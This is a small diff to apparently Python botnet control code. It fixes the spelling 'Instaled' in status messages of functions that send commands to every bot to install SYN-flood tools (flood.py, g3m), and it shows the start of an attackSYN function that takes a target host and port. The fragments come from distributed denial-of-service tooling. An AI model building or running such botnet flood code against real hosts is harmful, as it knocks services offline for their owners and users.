@@ -126,7 +126,7 @@ def installSYN(command):
     for client in botNet:
         out = client.send_command(command)
         print out
-    print("[*] flood.py Instaled!")
+    print("[*] flood.py Installed!")
 
 def g3m(command):
     print("[*] Install %sg3m%s on Bots"%(YELLOW,ENDC))
@@ -134,7 +134,7 @@ def g3m(command):
     for client in botNet:
         out = client.send_command(command)
         print out
-    print("[*] flood g3m Instaled!")
+    print("[*] flood g3m Installed!")
 
 def attackSYN(host,porta):
     for client in botNet:
